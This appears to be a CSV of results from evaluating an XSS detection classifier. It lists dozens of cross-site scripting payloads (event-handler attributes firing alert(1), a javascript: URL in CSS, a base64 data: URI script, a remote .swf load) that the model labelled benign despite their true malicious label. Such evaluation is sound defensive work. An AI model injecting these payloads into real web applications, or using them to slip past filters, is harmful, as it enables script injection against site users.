payload,true_label,predicted_label,probabilities,inference_time_ms
"<style>@keyframes slidein {}</style><hr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></hr>",1,0,"{'benign': 0.6043, 'malicious': 0.3957}",157.81499999999937
"<acronym draggable=""true"" ondrag=""alert(1)"">test</acronym>",1,0,"{'benign': 0.5936, 'malicious': 0.4064}",72.88040000000251
<meta id=x tabindex=1 onactivate=alert(1)></meta>,1,0,"{'benign': 0.5943, 'malicious': 0.4057}",79.52350000000052
<ul onpointerdown=alert(1)>XSS</ul>,1,0,"{'benign': 0.5968, 'malicious': 0.4032}",90.68869999999407
"<tbody oncut=""alert(1)"" contenteditable>test</tbody>",1,0,"{'benign': 0.5955, 'malicious': 0.4045}",89.36220000000361
<meter onpointerdown=alert(1)>XSS</meter>,1,0,"{'benign': 0.5962, 'malicious': 0.4038}",65.6006999999974
"<p oncut=""alert(1)"" contenteditable>test</p>",1,0,"{'benign': 0.5936, 'malicious': 0.4064}",87.40269999999839
"<link onmousedown=""alert(1)"">test</link>",1,0,"{'benign': 0.5902, 'malicious': 0.4098}",94.2707000000027
<listing onpointerup=alert(1)>XSS</listing>,1,0,"{'benign': 0.6002, 'malicious': 0.3998}",106.13920000000121
"<caption onkeyup=""alert(1)"" contenteditable>test</caption>",1,0,"{'benign': 0.5955, 'malicious': 0.4045}",71.17789999999502
"<em draggable=""true"" ondrag=""alert(1)"">test</em>",1,0,"{'benign': 0.5921, 'malicious': 0.4079}",86.02590000000276
"<style>:target {color: red;}</style><base id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></base>",1,0,"{'benign': 0.5998, 'malicious': 0.4002}",113.43980000000187
<s id=x tabindex=1 onactivate=alert(1)></s>,1,0,"{'benign': 0.592, 'malicious': 0.408}",413.97380000000084
"<acronym onmouseover=""alert(1)"">test</acronym>",1,0,"{'benign': 0.5894, 'malicious': 0.4106}",169.55810000000326
"<object onkeydown=""alert(1)"" contenteditable>test</object>",1,0,"{'benign': 0.5935, 'malicious': 0.4065}",92.6082000000008
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><select id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></select>",1,0,"{'benign': 0.6062, 'malicious': 0.3938}",179.29579999999845
"<h1 oncut=""alert(1)"" contenteditable>test</h1>",1,0,"{'benign': 0.5955, 'malicious': 0.4045}",79.62069999999954
"<html oncontextmenu=""alert(1)"">test</html>",1,0,"{'benign': 0.5983, 'malicious': 0.4017}",69.6301000000048
<form onpointerdown=alert(1)>XSS</form>,1,0,"{'benign': 0.5966, 'malicious': 0.4034}",81.78200000000402
"<style>:target {color:red;}</style><tr id=x style=""transition:color 1s"" ontransitionend=alert(1)></tr>",1,0,"{'benign': 0.5982, 'malicious': 0.4018}",169.17010000000232
"<button draggable=""true"" ondrag=""alert(1)"">test</button>",1,0,"{'benign': 0.5901, 'malicious': 0.4099}",399.6189000000001
"<style>@keyframes x{}</style><source style=""animation-name:x"" onanimationstart=""alert(1)""></source>",1,0,"{'benign': 0.6051, 'malicious': 0.3949}",154.70020000000062
<dfn id=x tabindex=1 onfocusin=alert(1)></dfn>,1,0,"{'benign': 0.6009, 'malicious': 0.3991}",177.52889999999866
"<rt draggable=""true"" ondragend=""alert(1)"">test</rt>",1,0,"{'benign': 0.5904, 'malicious': 0.4096}",61.827699999994934
<q onpointerenter=alert(1)>XSS</q>,1,0,"{'benign': 0.6033, 'malicious': 0.3967}",74.24129999999707
<dfn onpointerleave=alert(1)>XSS</dfn>,1,0,"{'benign': 0.599, 'malicious': 0.401}",68.88640000000379
"<style>:target {color:red;}</style><title id=x style=""transition:color 1s"" ontransitionend=alert(1)></title>",1,0,"{'benign': 0.5992, 'malicious': 0.4008}",81.69319999999658
"<acronym onmouseenter=""alert(1)"">test</acronym>",1,0,"{'benign': 0.5878, 'malicious': 0.4122}",66.6127000000003
"<hgroup onmouseout=""alert(1)"">test</hgroup>",1,0,"{'benign': 0.5908, 'malicious': 0.4092}",79.40789999999964
<footer onpointerup=alert(1)>XSS</footer>,1,0,"{'benign': 0.5991, 'malicious': 0.4009}",102.82090000000466
"<sub draggable=""true"" ondragenter=""alert(1)"">test</sub>",1,0,"{'benign': 0.5912, 'malicious': 0.4088}",90.01059999999939
"<del onbeforepaste=""alert(1)"" contenteditable>test</del>",1,0,"{'benign': 0.5932, 'malicious': 0.4068}",66.26349999999803
"<thead onmouseleave=""alert(1)"">test</thead>",1,0,"{'benign': 0.5865, 'malicious': 0.4135}",71.66809999999657
<nav onpointerup=alert(1)>XSS</nav>,1,0,"{'benign': 0.5967, 'malicious': 0.4033}",62.41300000000649
"<style>@keyframes slidein {}</style><spacer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></spacer>",1,0,"{'benign': 0.6021, 'malicious': 0.3979}",136.13699999999085
"<del oncontextmenu=""alert(1)"">test</del>",1,0,"{'benign': 0.5954, 'malicious': 0.4046}",69.61859999999831
<svg><head onload=alert(1)></head>,1,0,"{'benign': 0.5934, 'malicious': 0.4066}",58.21280000000684
<isindex id=x tabindex=1 onfocusin=alert(1)></isindex>,1,0,"{'benign': 0.6037, 'malicious': 0.3963}",94.01069999999834
"<style>:target {transform: rotate(180deg);}</style><dialog id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dialog>",1,0,"{'benign': 0.6071, 'malicious': 0.3929}",160.46790000000044
<footer id=x tabindex=1 onbeforedeactivate=alert(1)></footer><input autofocus>,1,0,"{'benign': 0.5998, 'malicious': 0.4002}",100.59150000000727
<html id=x tabindex=1 ondeactivate=alert(1)></html><input id=y autofocus>,1,0,"{'benign': 0.5962, 'malicious': 0.4038}",83.06360000000268
"<basefont onkeydown=""alert(1)"" contenteditable>test</basefont>",1,0,"{'benign': 0.5933, 'malicious': 0.4067}",56.62399999999934
"<video onkeyup=""alert(1)"" contenteditable>test</video>",1,0,"{'benign': 0.5934, 'malicious': 0.4066}",60.88219999999467
"<meter onmousemove=""alert(1)"">test</meter>",1,0,"{'benign': 0.5889, 'malicious': 0.4111}",63.42240000000743
<animate onpointermove=alert(1)>XSS</animate>,1,0,"{'benign': 0.5985, 'malicious': 0.4015}",58.11110000000497
<base id=x tabindex=1 onbeforedeactivate=alert(1)></base><input autofocus>,1,0,"{'benign': 0.5998, 'malicious': 0.4002}",103.29980000000205
"<div draggable=""true"" contenteditable>drag me</div><frameset ondrop=alert(1) contenteditable>drop here</frameset>",1,0,"{'benign': 0.6019, 'malicious': 0.3981}",70.60219999999617
"<multicol onmouseup=""alert(1)"">test</multicol>",1,0,"{'benign': 0.5865, 'malicious': 0.4135}",68.83390000000134
"<a onmousedown=""alert(1)"">test</a>",1,0,"{'benign': 0.59, 'malicious': 0.41}",48.13659999999231
"<marquee draggable=""true"" ondragend=""alert(1)"">test</marquee>",1,0,"{'benign': 0.5921, 'malicious': 0.4079}",72.3026999999945
"<button onmouseleave=""alert(1)"">test</button>",1,0,"{'benign': 0.5858, 'malicious': 0.4142}",73.03449999999145
"<caption onbeforecut=""alert(1)"" contenteditable>test</caption>",1,0,"{'benign': 0.598, 'malicious': 0.402}",74.37200000001098
<th id=x tabindex=1 onfocusin=alert(1)></th>,1,0,"{'benign': 0.5977, 'malicious': 0.4023}",60.16800000000444
<img id=x tabindex=1 onfocus=alert(1)></img>,1,0,"{'benign': 0.5909, 'malicious': 0.4091}",54.123399999994604
<rp onpointerenter=alert(1)>XSS</rp>,1,0,"{'benign': 0.6055, 'malicious': 0.3945}",53.864599999997154
"<basefont ondblclick=""alert(1)"">test</basefont>",1,0,"{'benign': 0.5865, 'malicious': 0.4135}",61.58209999999542
"<summary onmouseup=""alert(1)"">test</summary>",1,0,"{'benign': 0.5911, 'malicious': 0.4089}",69.05940000000044
"<title draggable=""true"" ondragend=""alert(1)"">test</title>",1,0,"{'benign': 0.5898, 'malicious': 0.4102}",72.01430000000641
"<area draggable=""true"" ondragenter=""alert(1)"">test</area>",1,0,"{'benign': 0.5912, 'malicious': 0.4088}",70.07630000001086
"<s onmouseenter=""alert(1)"">test</s>",1,0,"{'benign': 0.5826, 'malicious': 0.4174}",46.49099999998896
"<br onmouseleave=""alert(1)"">test</br>",1,0,"{'benign': 0.5867, 'malicious': 0.4133}",66.76489999999546
"<wbr onmouseleave=""alert(1)"">test</wbr>",1,0,"{'benign': 0.5876, 'malicious': 0.4124}",69.8716999999931
<svg><nav onload=alert(1)></nav>,1,0,"{'benign': 0.5904, 'malicious': 0.4096}",59.238300000004074
"<textarea onmouseup=""alert(1)"">test</textarea>",1,0,"{'benign': 0.5867, 'malicious': 0.4133}",72.55709999999738
"<head onkeypress=""alert(1)"" contenteditable>test</head>",1,0,"{'benign': 0.5956, 'malicious': 0.4044}",52.37220000000775
"<style>:target {transform: rotate(180deg);}</style><nobr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></nobr>",1,0,"{'benign': 0.6084, 'malicious': 0.3916}",89.41799999999489
"<tbody onkeyup=""alert(1)"" contenteditable>test</tbody>",1,0,"{'benign': 0.5959, 'malicious': 0.4041}",79.99250000000302
<sub onpointerover=alert(1)>XSS</sub>,1,0,"{'benign': 0.5989, 'malicious': 0.4011}",58.63759999999729
"<big draggable=""true"" ondragend=""alert(1)"">test</big>",1,0,"{'benign': 0.59, 'malicious': 0.41}",81.9675999999987
<bdo onpointermove=alert(1)>XSS</bdo>,1,0,"{'benign': 0.6019, 'malicious': 0.3981}",68.01389999999685
"<div draggable=""true"" contenteditable>drag me</div><map ondrop=alert(1) contenteditable>drop here</map>",1,0,"{'benign': 0.6014, 'malicious': 0.3986}",78.89930000000334
"<meta onkeydown=""alert(1)"" contenteditable>test</meta>",1,0,"{'benign': 0.5921, 'malicious': 0.4079}",55.98590000001025
<svg><param onload=alert(1)></param>,1,0,"{'benign': 0.5919, 'malicious': 0.4081}",68.17010000000323
<abbr id=x tabindex=1 onfocusin=alert(1)></abbr>,1,0,"{'benign': 0.5998, 'malicious': 0.4002}",79.60959999999773
<multicol onpointerdown=alert(1)>XSS</multicol>,1,0,"{'benign': 0.5983, 'malicious': 0.4017}",66.76589999999294
"<input draggable=""true"" ondragend=""alert(1)"">test</input>",1,0,"{'benign': 0.5851, 'malicious': 0.4149}",62.73739999998895
<p onblur=alert(1) tabindex=1 id=x></p><input autofocus>,1,0,"{'benign': 0.5968, 'malicious': 0.4032}",77.25690000000895
"<style>:target {color:red;}</style><meta id=x style=""transition:color 1s"" ontransitionend=alert(1)></meta>",1,0,"{'benign': 0.5985, 'malicious': 0.4015}",95.94659999999067
<li onpointerleave=alert(1)>XSS</li>,1,0,"{'benign': 0.5953, 'malicious': 0.4047}",62.34930000000816
<select onpointerover=alert(1)>XSS</select>,1,0,"{'benign': 0.5952, 'malicious': 0.4048}",111.79599999999823
"<style>:target {color: red;}</style><marquee id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></marquee>",1,0,"{'benign': 0.6, 'malicious': 0.4}",119.49189999999987
"<aside onclick=""alert(1)"">test</aside>",1,0,"{'benign': 0.5866, 'malicious': 0.4134}",55.181200000006925
"<summary ondblclick=""alert(1)"">test</summary>",1,0,"{'benign': 0.5861, 'malicious': 0.4139}",69.49300000000846
<select id=x tabindex=1 onbeforedeactivate=alert(1)></select><input autofocus>,1,0,"{'benign': 0.5979, 'malicious': 0.4021}",70.50600000000884
<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>,1,0,"{'benign': 0.5998, 'malicious': 0.4002}",98.0503999999911
<frameset><frame id=x onfocus=alert(1)>,1,0,"{'benign': 0.6011, 'malicious': 0.3989}",88.98109999999804
"<div draggable=""true"" contenteditable>drag me</div><track ondrop=alert(1) contenteditable>drop here</track>",1,0,"{'benign': 0.6015, 'malicious': 0.3985}",168.8601000000034
"<figure draggable=""true"" ondragend=""alert(1)"">test</figure>",1,0,"{'benign': 0.5893, 'malicious': 0.4107}",90.80699999999808
"<hr draggable=""true"" ondrag=""alert(1)"">test</hr>",1,0,"{'benign': 0.5923, 'malicious': 0.4077}",76.08609999999771
"<address onmousedown=""alert(1)"">test</address>",1,0,"{'benign': 0.5904, 'malicious': 0.4096}",67.70889999999952
"<template draggable=""true"" ondragstart=""alert(1)"">test</template>",1,0,"{'benign': 0.5913, 'malicious': 0.4087}",65.61439999998697
"<style>@keyframes x{}</style><figure style=""animation-name:x"" onanimationstart=""alert(1)""></figure>",1,0,"{'benign': 0.6048, 'malicious': 0.3952}",81.77699999998822
"<style>:target {transform: rotate(180deg);}</style><a id=x style=""transition:transform 									2s"" ontransitionrun=alert(1)></a>",1,0,"{'benign': 0.6079, 'malicious': 0.3921}",106.7769999999939
"<mark onmouseout=""alert(1)"">test</mark>",1,0,"{'benign': 0.5886, 'malicious': 0.4114}",94.20859999998754
"<basefont onbeforepaste=""alert(1)"" contenteditable>test</basefont>",1,0,"{'benign': 0.5949, 'malicious': 0.4051}",72.24829999999827
"<bdo onbeforecut=""alert(1)"" contenteditable>test</bdo>",1,0,"{'benign': 0.5988, 'malicious': 0.4012}",82.95209999999997
"<ruby onkeydown=""alert(1)"" contenteditable>test</ruby>",1,0,"{'benign': 0.594, 'malicious': 0.406}",70.77120000001003
"<style>:target {color: red;}</style><bgsound id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bgsound>",1,0,"{'benign': 0.6002, 'malicious': 0.3998}",115.49170000000686
"<cite onmousedown=""alert(1)"">test</cite>",1,0,"{'benign': 0.5908, 'malicious': 0.4092}",67.6878999999957
<svg><mark onload=alert(1)></mark>,1,0,"{'benign': 0.5905, 'malicious': 0.4095}",72.53700000001118
<data id=x tabindex=1 onbeforedeactivate=alert(1)></data><input autofocus>,1,0,"{'benign': 0.5988, 'malicious': 0.4012}",224.7646000000003
"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onanimationend=""alert(1)""></bdi>",1,0,"{'benign': 0.6018, 'malicious': 0.3982}",121.14569999999958
<style onpointerdown=alert(1)>XSS</style>,1,0,"{'benign': 0.596, 'malicious': 0.404}",79.02819999999622
<big onpointerout=alert(1)>XSS</big>,1,0,"{'benign': 0.6049, 'malicious': 0.3951}",104.11349999999686
"<shadow onmousemove=""alert(1)"">test</shadow>",1,0,"{'benign': 0.5867, 'malicious': 0.4133}",110.15609999999754
<body onpointerout=alert(1)>XSS</body>,1,0,"{'benign': 0.6023, 'malicious': 0.3977}",105.82410000000664
<style onpointerenter=alert(1)>XSS</style>,1,0,"{'benign': 0.6004, 'malicious': 0.3996}",71.25890000000368
"<rtc draggable=""true"" ondragleave=""alert(1)"">test</rtc>",1,0,"{'benign': 0.5937, 'malicious': 0.4063}",67.86999999999921
<frame onpointerup=alert(1)>XSS</frame>,1,0,"{'benign': 0.5973, 'malicious': 0.4027}",65.64889999999934
"<div draggable=""true"" contenteditable>drag me</div><area ondrop=alert(1) contenteditable>drop here</area>",1,0,"{'benign': 0.6016, 'malicious': 0.3984}",91.5323999999913
"<style>:target {color:red;}</style><button id=x style=""transition:color 1s"" ontransitionend=alert(1)></button>",1,0,"{'benign': 0.5976, 'malicious': 0.4024}",169.04480000000888
"<style>@keyframes x{}</style><progress style=""animation-name:x"" onanimationend=""alert(1)""></progress>",1,0,"{'benign': 0.6016, 'malicious': 0.3984}",78.90329999999324
"<dd oncopy=""alert(1)"" contenteditable>test</dd>",1,0,"{'benign': 0.5965, 'malicious': 0.4035}",67.16849999999397
"<spacer oncontextmenu=""alert(1)"">test</spacer>",1,0,"{'benign': 0.5961, 'malicious': 0.4039}",105.6926000000118
"<command draggable=""true"" ondragstart=""alert(1)"">test</command>",1,0,"{'benign': 0.591, 'malicious': 0.409}",125.27809999998851
"<style>:target {transform: rotate(180deg);}</style><address id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></address>",1,0,"{'benign': 0.6085, 'malicious': 0.3915}",392.3185000000018
<ins onpointerleave=alert(1)>XSS</ins>,1,0,"{'benign': 0.5965, 'malicious': 0.4035}",87.14750000000038
"<center onbeforecut=""alert(1)"" contenteditable>test</center>",1,0,"{'benign': 0.5954, 'malicious': 0.4046}",158.87499999999477
<keygen onpointerleave=alert(1)>XSS</keygen>,1,0,"{'benign': 0.5985, 'malicious': 0.4015}",80.85609999999122
<applet onpointermove=alert(1)>XSS</applet>,1,0,"{'benign': 0.5987, 'malicious': 0.4013}",111.7734999999982
"SRC=""http://ha.ckers.org/.swf"" AllowScriptAccess=""always""",1,0,"{'benign': 0.5909, 'malicious': 0.4091}",112.41590000000201
&#X000003C;,1,0,"{'benign': 0.5685, 'malicious': 0.4315}",67.53690000000745
"<form><input type=search onsearch=alert(1) value=""Hit return"" autofocus>",1,0,"{'benign': 0.5984, 'malicious': 0.4016}",68.45780000000445
<dir onpointerenter=alert(1)>XSS</dir>,1,0,"{'benign': 0.6041, 'malicious': 0.3959}",73.85670000000744
"<style>:target {color:red;}</style><section id=x style=""transition:color 1s"" ontransitionend=alert(1)></section>",1,0,"{'benign': 0.5988, 'malicious': 0.4012}",108.4202999999917
<body ontouchstart=alert(1)> ,1,0,"{'benign': 0.5899, 'malicious': 0.4101}",63.08119999999917
"<div draggable=""true"" contenteditable>drag me</div><content ondrop=alert(1) contenteditable>drop here</content>",1,0,"{'benign': 0.6002, 'malicious': 0.3998}",103.67390000000398
"<style>:target {color:red;}</style><fieldset id=x style=""transition:color 1s"" ontransitionend=alert(1)></fieldset>",1,0,"{'benign': 0.5973, 'malicious': 0.4027}",118.09520000001328
"<datalist draggable=""true"" ondragend=""alert(1)"">test</datalist>",1,0,"{'benign': 0.5915, 'malicious': 0.4085}",128.22729999999183
<frameset onpointerup=alert(1)>XSS</frameset>,1,0,"{'benign': 0.5987, 'malicious': 0.4013}",235.1713999999987
"<style>:target {transform: rotate(180deg);}</style><data id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></data>",1,0,"{'benign': 0.6089, 'malicious': 0.3911}",123.28809999999635
<menuitem id=x tabindex=1 onbeforedeactivate=alert(1)></menuitem><input autofocus>,1,0,"{'benign': 0.6009, 'malicious': 0.3991}",70.654200000007
<input type=checkbox id=x onfocusin=alert(1)>,1,0,"{'benign': 0.5961, 'malicious': 0.4039}",79.01730000000384
<rp id=x tabindex=1 ondeactivate=alert(1)></rp><input id=y autofocus>,1,0,"{'benign': 0.5951, 'malicious': 0.4049}",93.0196000000052
"<img draggable=""true"" ondragleave=""alert(1)"">test</img>",1,0,"{'benign': 0.5888, 'malicious': 0.4112}",85.45920000000251
<element id=x tabindex=1 ondeactivate=alert(1)></element><input id=y autofocus>,1,0,"{'benign': 0.5927, 'malicious': 0.4073}",93.97390000000883
<q id=x tabindex=1 onactivate=alert(1)></q>,1,0,"{'benign': 0.5969, 'malicious': 0.4031}",164.73540000001208
"<command onmouseleave=""alert(1)"">test</command>",1,0,"{'benign': 0.5875, 'malicious': 0.4125}",100.7277000000073
"<q onkeydown=""alert(1)"" contenteditable>test</q>",1,0,"{'benign': 0.5948, 'malicious': 0.4052}",92.04430000001196
"<nextid onbeforecut=""alert(1)"" contenteditable>test</nextid>",1,0,"{'benign': 0.5977, 'malicious': 0.4023}",160.46670000000063
"<style>@keyframes x{}</style><listing style=""animation-name:x"" onanimationstart=""alert(1)""></listing>",1,0,"{'benign': 0.6055, 'malicious': 0.3945}",93.45640000000799
"<div draggable=""true"" contenteditable>drag me</div><dir ondrop=alert(1) contenteditable>drop here</dir>",1,0,"{'benign': 0.6036, 'malicious': 0.3964}",110.07550000000776
"<div draggable=""true"" contenteditable>drag me</div><noframes ondrop=alert(1) contenteditable>drop here</noframes>",1,0,"{'benign': 0.6031, 'malicious': 0.3969}",348.4451000000064
"<style>@keyframes slidein {}</style><mark style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></mark>",1,0,"{'benign': 0.6034, 'malicious': 0.3966}",126.16959999999722
"<style>:target {color:red;}</style><ul id=x style=""transition:color 1s"" ontransitionend=alert(1)></ul>",1,0,"{'benign': 0.5975, 'malicious': 0.4025}",107.68810000000428
"<cite onbeforecut=""alert(1)"" contenteditable>test</cite>",1,0,"{'benign': 0.5972, 'malicious': 0.4028}",62.604399999997895
<th id=x tabindex=1 onbeforedeactivate=alert(1)></th><input autofocus>,1,0,"{'benign': 0.5994, 'malicious': 0.4006}",82.65010000000927
"<style>:target {color:red;}</style><template id=x style=""transition:color 1s"" ontransitionend=alert(1)></template>",1,0,"{'benign': 0.5982, 'malicious': 0.4018}",96.21470000000443
<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>,1,0,"{'benign': 0.6, 'malicious': 0.4}",107.59260000000381
"<button onkeydown=""alert(1)"" contenteditable>test</button>",1,0,"{'benign': 0.5919, 'malicious': 0.4081}",78.55809999999508
"<style>@keyframes x{}</style><optgroup style=""animation-name:x"" onanimationstart=""alert(1)""></optgroup>",1,0,"{'benign': 0.6042, 'malicious': 0.3958}",77.50129999999444
<svg><applet onload=alert(1)></applet>,1,0,"{'benign': 0.5973, 'malicious': 0.4027}",75.94369999999628
writetitle(),1,0,"{'benign': 0.5669, 'malicious': 0.4331}",49.38409999999749
"<style>@keyframes x{}</style><footer style=""animation-name:x"" onanimationstart=""alert(1)""></footer>",1,0,"{'benign': 0.6039, 'malicious': 0.3961}",74.20689999999297
"<dfn draggable=""true"" ondrag=""alert(1)"">test</dfn>",1,0,"{'benign': 0.5942, 'malicious': 0.4058}",90.94920000001139
"<option onmouseout=""alert(1)"">test</option>",1,0,"{'benign': 0.5883, 'malicious': 0.4117}",69.91410000000542
"<bgsound onkeypress=""alert(1)"" contenteditable>test</bgsound>",1,0,"{'benign': 0.5939, 'malicious': 0.4061}",76.96419999999193
"<ruby onkeypress=""alert(1)"" contenteditable>test</ruby>",1,0,"{'benign': 0.5946, 'malicious': 0.4054}",110.94409999999755
<embed onpointerup=alert(1)>XSS</embed>,1,0,"{'benign': 0.5973, 'malicious': 0.4027}",110.13839999999675
"<svg onmouseout=""alert(1)"">test</svg>",1,0,"{'benign': 0.5884, 'malicious': 0.4116}",112.2696999999988
"<style>:target {color:red;}</style><bdo id=x style=""transition:color 1s"" ontransitionend=alert(1)></bdo>",1,0,"{'benign': 0.5973, 'malicious': 0.4027}",108.08099999999854
"<param draggable=""true"" ondragleave=""alert(1)"">test</param>",1,0,"{'benign': 0.5935, 'malicious': 0.4065}",100.03139999999178
"<style>@keyframes slidein {}</style><kbd style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></kbd>",1,0,"{'benign': 0.604, 'malicious': 0.396}",124.49410000000682
"<plaintext draggable=""true"" ondragenter=""alert(1)"">test</plaintext>",1,0,"{'benign': 0.5931, 'malicious': 0.4069}",156.19170000000793
"<noscript onmouseover=""alert(1)"">test</noscript>",1,0,"{'benign': 0.5908, 'malicious': 0.4092}",68.52339999998946
"<li onbeforepaste=""alert(1)"" contenteditable>test</li>",1,0,"{'benign': 0.5934, 'malicious': 0.4066}",72.07249999999021
<link onfocusout=alert(1) tabindex=1 id=x></link><input autofocus>,1,0,"{'benign': 0.6029, 'malicious': 0.3971}",311.0379000000023
"<div draggable=""true"" contenteditable>drag me</div><form ondrop=alert(1) contenteditable>drop here</form>",1,0,"{'benign': 0.6006, 'malicious': 0.3994}",88.89369999999985
"<style>@keyframes slidein {}</style><script style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></script>",1,0,"{'benign': 0.6045, 'malicious': 0.3955}",109.2000000000013
<i id=x tabindex=1 onbeforedeactivate=alert(1)></i><input autofocus>,1,0,"{'benign': 0.602, 'malicious': 0.398}",69.12130000000616
"<colgroup draggable=""true"" ondrag=""alert(1)"">test</colgroup>",1,0,"{'benign': 0.5901, 'malicious': 0.4099}",85.42630000000884
"<div ondblclick=""alert(1)"">test</div>",1,0,"{'benign': 0.5827, 'malicious': 0.4173}",99.99779999999703
"<blockquote onpaste=""alert(1)"" contenteditable>test</blockquote>",1,0,"{'benign': 0.5962, 'malicious': 0.4038}",69.22040000000607
"<mark draggable=""true"" ondragenter=""alert(1)"">test</mark>",1,0,"{'benign': 0.5888, 'malicious': 0.4112}",67.52529999999979
"<frameset onmouseup=""alert(1)"">test</frameset>",1,0,"{'benign': 0.5886, 'malicious': 0.4114}",66.26269999999579
<section id=x tabindex=1 onfocus=alert(1)></section>,1,0,"{'benign': 0.5942, 'malicious': 0.4058}",297.4425000000025
"<datalist onmouseup=""alert(1)"">test</datalist>",1,0,"{'benign': 0.589, 'malicious': 0.411}",126.88689999998815
"<title onclick=""alert(1)"">test</title>",1,0,"{'benign': 0.5875, 'malicious': 0.4125}",100.38990000001036
"<style>:target {color:red;}</style><link id=x style=""transition:color 1s"" ontransitionend=alert(1)></link>",1,0,"{'benign': 0.5965, 'malicious': 0.4035}",164.59690000000649
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></caption>",1,0,"{'benign': 0.6086, 'malicious': 0.3914}",229.9742000000009
"<isindex onkeyup=""alert(1)"" contenteditable>test</isindex>",1,0,"{'benign': 0.5944, 'malicious': 0.4056}",149.62099999999623
"<embed draggable=""true"" ondragend=""alert(1)"">test</embed>",1,0,"{'benign': 0.588, 'malicious': 0.412}",122.34229999999968
<dt onpointerdown=alert(1)>XSS</dt>,1,0,"{'benign': 0.5966, 'malicious': 0.4034}",103.06990000000837
"<noscript draggable=""true"" ondragend=""alert(1)"">test</noscript>",1,0,"{'benign': 0.5938, 'malicious': 0.4062}",79.87099999999714
"<fieldset onmouseleave=""alert(1)"">test</fieldset>",1,0,"{'benign': 0.5877, 'malicious': 0.4123}",120.82959999999332
"<style>@keyframes slidein {}</style><meter style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></meter>",1,0,"{'benign': 0.604, 'malicious': 0.396}",146.5240999999935
"<br onmousedown=""alert(1)"">test</br>",1,0,"{'benign': 0.5897, 'malicious': 0.4103}",67.33979999999917
<menu onpointerenter=alert(1)>XSS</menu>,1,0,"{'benign': 0.6038, 'malicious': 0.3962}",74.7192000000041
onFocus(),1,0,"{'benign': 0.5655, 'malicious': 0.4345}",57.370800000001054
"<a onbeforecopy=""alert(1)"" contenteditable>test</a>",1,0,"{'benign': 0.5971, 'malicious': 0.4029}",74.89160000000084
"<li onpaste=""alert(1)"" contenteditable>test</li>",1,0,"{'benign': 0.5913, 'malicious': 0.4087}",68.28210000000468
<mark id=x tabindex=1 ondeactivate=alert(1)></mark><input id=y autofocus>,1,0,"{'benign': 0.5936, 'malicious': 0.4064}",81.62300000000755
<kbd onpointerleave=alert(1)>XSS</kbd>,1,0,"{'benign': 0.5986, 'malicious': 0.4014}",95.79909999999359
<em onpointerleave=alert(1)>XSS</em>,1,0,"{'benign': 0.5966, 'malicious': 0.4034}",106.34679999999719
"<META HTTP-EQUIV=""Link"" Content=""<http://.rocks/.css>; REL=stylesheet"">",1,0,"{'benign': 0.5958, 'malicious': 0.4042}",100.44200000000103
"<STYLE>li {list-style-image: url(""javascript:alert('')"");}</STYLE><UL><LI></br>",1,0,"{'benign': 0.5964, 'malicious': 0.4036}",136.47779999999443
<tt onpointerout=alert(1)>XSS</tt>,1,0,"{'benign': 0.6007, 'malicious': 0.3993}",114.79129999999316
"/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",1,0,"{'benign': 0.5921, 'malicious': 0.4079}",102.33449999999777
"<command oncopy=""alert(1)"" contenteditable>test</command>",1,0,"{'benign': 0.5971, 'malicious': 0.4029}",113.96489999999915
